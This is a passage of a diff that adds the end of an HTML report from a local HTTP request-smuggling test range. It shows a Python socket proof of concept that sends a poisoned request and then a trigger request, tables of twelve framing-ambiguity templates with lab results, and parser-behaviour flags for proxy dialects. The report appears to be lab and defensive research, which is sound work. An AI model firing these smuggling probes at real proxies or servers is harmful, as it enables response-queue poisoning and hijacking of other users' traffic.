+    b&#x27;GET /__lab/echo/SMUGGLE_MARKER HTTP/1.1\r\n&#x27;
+    b&#x27;Host: smuggled\r\n&#x27;
+    b&#x27;Content-Length: 96\r\n&#x27;
+    b&#x27;\r\n&#x27;
+)
+
+s = socket.create_connection((HOST, PORT), timeout=3)
+s.sendall(poison)
+time.sleep(0.1)
+s.close()          # close the attacker connection first
+
+# Now a fresh connection; the hidden request executes for it if the
+# two hops disagreed about where the poison&#x27;s body ended:
+t = socket.create_connection((HOST, PORT), timeout=3)
+trigger = (
+    b&#x27;POST /__lab/echo/TRIGGER_MARKER HTTP/1.1\r\n&#x27;
+    b&#x27;Host: trigger\r\n&#x27;
+    b&#x27;Content-Length: 18\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;VVVVVVVVVVVVVVVVVV&#x27;
+)
+t.sendall(trigger)
+print(t.recv(65535))
+t.close()
+</pre></details>
+      <details class="instr">
+        <summary>Instrumented framing differential (all 12 templates)</summary>
+        <p class="note">Measured from the lab's own per-hop framing record. This can see
+        every ambiguity family, including ones a remote target could not confirm without
+        timing noise. It validates the range and the templates, not a remote target.</p>
+        <div class="tablewrap"><table class="grid"><thead><tr><th>template</th><th>family</th><th>ambiguity</th><th>framing differential</th></tr></thead><tbody><tr class="clean"><td><code>cl_te</code></td><td>CL.TE</td><td>Content-Length + Transfer-Encoding (front trusts CL)</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_cl</code></td><td>TE.CL</td><td>Transfer-Encoding + Content-Length (front trusts TE)</td><td>both hops framed the same boundaries</td></tr><tr class="vuln"><td><code>te_te_unknown</code></td><td>TE.TE</td><td>Duplicate Transfer-Encoding, unknown coding after chunked</td><td>back end also framed: /__lab/echo/Bc1864b97e146</td></tr><tr class="vuln"><td><code>te_te_space</code></td><td>TE.TE</td><td>Transfer-Encoding value with trailing whitespace</td><td>back end also framed: /__lab/echo/Bc2f69372ef8c</td></tr><tr class="clean"><td><code>te_te_identity</code></td><td>TE.TE</td><td>chunked followed by identity</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_name_ws</code></td><td>TE.TE</td><td>Whitespace before the colon on a second TE header</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_dup_chunked</code></td><td>TE.TE</td><td>Transfer-Encoding: chunked sent twice</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>cl_cl</code></td><td>CL.CL</td><td>Duplicate Content-Length, large first / small second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>cl_cl_reverse</code></td><td>CL.CL</td><td>Duplicate Content-Length, small first / large second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>bare_lf</code></td><td>LF</td><td>Bare-LF line terminators in the head</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_size_ws</code></td><td>CHUNK</td><td>Leading whitespace before the chunk size</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_ext</code></td><td>CHUNK</td><td>Chunk extension on the chunk-size line</td><td>both hops framed the same boundaries</td></tr></tbody></table></div>
+      </details>
+    </section>
+    </div>
+
+  
+    <section class="card appendix">
+      <h3>Coverage appendix</h3>
+      <h4>Ambiguity templates (12)</h4>
+      <div class="tablewrap"><table class="grid"><thead><tr><th>key</th><th>family</th><th>ambiguity</th>
+      <th>why it can split a request</th></tr></thead><tbody><tr><td><code>cl_te</code></td><td>CL.TE</td><td>Content-Length + Transfer-Encoding (front trusts CL)</td><td>A hop that obeys Content-Length reads the chunked-looking tail as body; a hop that obeys Transfer-Encoding reads it as a new request.</td></tr><tr><td><code>te_cl</code></td><td>TE.CL</td><td>Transfer-Encoding + Content-Length (front trusts TE)</td><td>The front decodes a short chunked body; the back obeys Content-Length, stops inside the chunk framing and turns the remainder into a request.</td></tr><tr><td><code>te_te_unknown</code></td><td>TE.TE</td><td>Duplicate Transfer-Encoding, unknown coding after chunked</td><td>One hop drops an unrecognised coding and still finds &#x27;chunked&#x27;; another treats the list as unusable and falls back to Content-Length.</td></tr><tr><td><code>te_te_space</code></td><td>TE.TE</td><td>Transfer-Encoding value with trailing whitespace</td><td>If one hop fails to trim the value it no longer sees the token &#x27;chunked&#x27;.</td></tr><tr><td><code>te_te_identity</code></td><td>TE.TE</td><td>chunked followed by identity</td><td>Some hops accept &#x27;identity&#x27; as terminating the list, others keep looking and never find chunked last.</td></tr><tr><td><code>te_te_name_ws</code></td><td>TE.TE</td><td>Whitespace before the colon on a second TE header</td><td>A lenient hop accepts the folded-in header; a strict one discards it.</td></tr><tr><td><code>te_te_dup_chunked</code></td><td>TE.TE</td><td>Transfer-Encoding: chunked sent twice</td><td>Hops differ on whether a repeated coding list is legal or collapses to a single chunked body.</td></tr><tr><td><code>cl_cl</code></td><td>CL.CL</td><td>Duplicate Content-Length, large first / small second</td><td>First-wins and last-wins hops disagree on the body length, so one hop leaves a request&#x27;s worth of bytes in the stream.</td></tr><tr><td><code>cl_cl_reverse</code></td><td>CL.CL</td><td>Duplicate Content-Length, small first / large second</td><td>The mirror image: a last-wins front and a first-wins back desync.</td></tr><tr><td><code>bare_lf</code></td><td>LF</td><td>Bare-LF line terminators in the head</td><td>Hops that accept bare LF agree with CRLF hops on where lines end, but some forward the raw bytes while rejecting them downstream.</td></tr><tr><td><code>chunk_size_ws</code></td><td>CHUNK</td><td>Leading whitespace before the chunk size</td><td>A lenient hop skips the space and decodes the chunk; a strict one errors or treats it as a different size.</td></tr><tr><td><code>chunk_ext</code></td><td>CHUNK</td><td>Chunk extension on the chunk-size line</td><td>Hops that mishandle the extension mis-locate the chunk data.</td></tr></tbody></table></div>
+      <h4>Wire shapes the black-box oracle can confirm (4)</h4>
+      <div class="tablewrap"><table class="grid"><thead><tr><th>key</th><th>family</th><th>shape</th></tr></thead>
+      <tbody><tr><td><code>cl_te</code></td><td>CL.TE</td><td>Front trusts Content-Length, origin trusts Transfer-Encoding</td></tr><tr><td><code>te_cl</code></td><td>TE.CL</td><td>Front trusts Transfer-Encoding, origin trusts Content-Length</td></tr><tr><td><code>cl_cl</code></td><td>CL.CL</td><td>Both honour Content-Length but disagree on which one</td></tr><tr><td><code>te_te</code></td><td>TE.TE</td><td>Two Transfer-Encoding headers, one unusable</td></tr></tbody></table></div>
+      <h4>Dialect divergence flags</h4>
+      <div class="tablewrap"><table class="grid"><thead><tr><th>dialect</th><th>framing-affecting flags</th></tr></thead>
+      <tbody><tr><td>apache</td><td><code>{&quot;accept_bare_lf&quot;: false, &quot;allow_obs_fold&quot;: true, &quot;allow_ws_before_colon&quot;: true, &quot;chunk_allow_0x&quot;: false, &quot;chunk_allow_ws&quot;: false, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;first&quot;, &quot;reject_bare_cr&quot;: true, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: false, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;chunked_wins&quot;}</code></td></tr><tr><td>envoy</td><td><code>{&quot;accept_bare_lf&quot;: false, &quot;allow_obs_fold&quot;: false, &quot;allow_ws_before_colon&quot;: false, &quot;chunk_allow_0x&quot;: false, &quot;chunk_allow_ws&quot;: false, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;reject&quot;, &quot;reject_bare_cr&quot;: true, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: true, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;reject&quot;}</code></td></tr><tr><td>go-origin</td><td><code>{&quot;accept_bare_lf&quot;: false, &quot;allow_obs_fold&quot;: false, &quot;allow_ws_before_colon&quot;: false, &quot;chunk_allow_0x&quot;: false, &quot;chunk_allow_ws&quot;: false, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;reject&quot;, &quot;reject_bare_cr&quot;: true, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: true, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;reject&quot;}</code></td></tr><tr><td>haproxy</td><td><code>{&quot;accept_bare_lf&quot;: false, &quot;allow_obs_fold&quot;: false, &quot;allow_ws_before_colon&quot;: false, &quot;chunk_allow_0x&quot;: false, &quot;chunk_allow_ws&quot;: false, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;reject&quot;, &quot;reject_bare_cr&quot;: true, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: true, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;reject&quot;}</code></td></tr><tr><td>java-origin</td><td><code>{&quot;accept_bare_lf&quot;: false, &quot;allow_obs_fold&quot;: true, &quot;allow_ws_before_colon&quot;: false, &quot;chunk_allow_0x&quot;: false, &quot;chunk_allow_ws&quot;: false, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;last&quot;, &quot;reject_bare_cr&quot;: true, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: true, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;chunked_wins&quot;}</code></td></tr><tr><td>legacy-lb</td><td><code>{&quot;accept_bare_lf&quot;: false, &quot;allow_obs_fold&quot;: true, &quot;allow_ws_before_colon&quot;: false, &quot;chunk_allow_0x&quot;: false, &quot;chunk_allow_ws&quot;: false, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;first&quot;, &quot;reject_bare_cr&quot;: true, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: true, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;cl_wins&quot;}</code></td></tr><tr><td>legacy-origin</td><td><code>{&quot;accept_bare_lf&quot;: true, &quot;allow_obs_fold&quot;: false, &quot;allow_ws_before_colon&quot;: true, &quot;chunk_allow_0x&quot;: true, &quot;chunk_allow_ws&quot;: true, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;first&quot;, &quot;reject_bare_cr&quot;: false, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: true, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;chunked_wins&quot;}</code></td></tr><tr><td>loose-proxy</td><td><code>{&quot;accept_bare_lf&quot;: true, &quot;allow_obs_fold&quot;: true, &quot;allow_ws_before_colon&quot;: true, &quot;chunk_allow_0x&quot;: true, &quot;chunk_allow_ws&quot;: true, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;first&quot;, &quot;reject_bare_cr&quot;: false, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: false, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;chunked_wins&quot;}</code></td></tr><tr><td>nginx</td><td><code>{&quot;accept_bare_lf&quot;: false, &quot;allow_obs_fold&quot;: true, &quot;allow_ws_before_colon&quot;: false, &quot;chunk_allow_0x&quot;: false, &quot;chunk_allow_ws&quot;: false, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: true, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;last&quot;, &quot;reject_bare_cr&quot;: true, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: true, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;chunked_wins&quot;}</code></td></tr><tr><td>node-origin</td><td><code>{&quot;accept_bare_lf&quot;: false, &quot;allow_obs_fold&quot;: false, &quot;allow_ws_before_colon&quot;: true, &quot;chunk_allow_0x&quot;: false, &quot;chunk_allow_ws&quot;: false, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;first&quot;, &quot;reject_bare_cr&quot;: true, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: true, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;cl_wins&quot;}</code></td></tr><tr><td>python-origin</td><td><code>{&quot;accept_bare_lf&quot;: false, &quot;allow_obs_fold&quot;: false, &quot;allow_ws_before_colon&quot;: false, &quot;chunk_allow_0x&quot;: false, &quot;chunk_allow_ws&quot;: false, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;last&quot;, &quot;reject_bare_cr&quot;: true, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: true, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;reject&quot;}</code></td></tr><tr><td>te-fallback</td><td><code>{&quot;accept_bare_lf&quot;: false, &quot;allow_obs_fold&quot;: false, &quot;allow_ws_before_colon&quot;: false, &quot;chunk_allow_0x&quot;: false, &quot;chunk_allow_ws&quot;: false, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;last&quot;, &quot;reject_bare_cr&quot;: true, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: false, &quot;te_requires_chunked_last&quot;: true, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;reject&quot;, &quot;te_unusable_falls_back_to_cl&quot;: true, &quot;te_with_cl&quot;: &quot;chunked_wins&quot;}</code></td></tr><tr><td>te-first-only</td><td><code>{&quot;accept_bare_lf&quot;: false, &quot;allow_obs_fold&quot;: false, &quot;allow_ws_before_colon&quot;: false, &quot;chunk_allow_0x&quot;: false, &quot;chunk_allow_ws&quot;: false, &quot;chunk_ext_policy&quot;: &quot;strip&quot;, &quot;cl_allow_comma&quot;: false, &quot;cl_allow_ows&quot;: true, &quot;cl_allow_sign&quot;: false, &quot;cl_duplicate_policy&quot;: &quot;last&quot;, &quot;reject_bare_cr&quot;: true, &quot;te_allow_ws_in_list&quot;: true, &quot;te_first_header_only&quot;: true, &quot;te_requires_chunked_last&quot;: true, &quot;te_tokens_casefold&quot;: true, &quot;te_unknown_policy&quot;: &quot;ignore&quot;, &quot;te_unusable_falls_back_to_cl&quot;: false, &quot;te_with_cl&quot;: &quot;chunked_wins&quot;}</code></td></tr></tbody></table></div>
+    </section>
+    
+
+  <div class="footer">
+    <p><strong>Method.</strong> A black-box finding requires a hidden request to execute
+    on a different client connection than the attacker's, after the attacker's connection
+    has closed, reproduced across trials, with a clean negative control. This is the
+    response-queue-poisoning mechanism, so the same probe travels to a remote target.</p>
+    <p><strong>Scope.</strong> The instrumented differential runs only against the local
+    range, where both hops are in-process. It covers ambiguity families a remote target
+    cannot confirm without timing noise (bare-LF, chunk-size whitespace, chunk extensions,
+    header-name whitespace, ...). It is labelled separately and never reported as a remote
+    finding.</p>
+    <p>Local test range only. All listeners bind 127.0.0.1. Dialect presets are
+    behavioural approximations, not copies of vendor code.</p>
+  </div>
+</div>
+</body>
+</html>
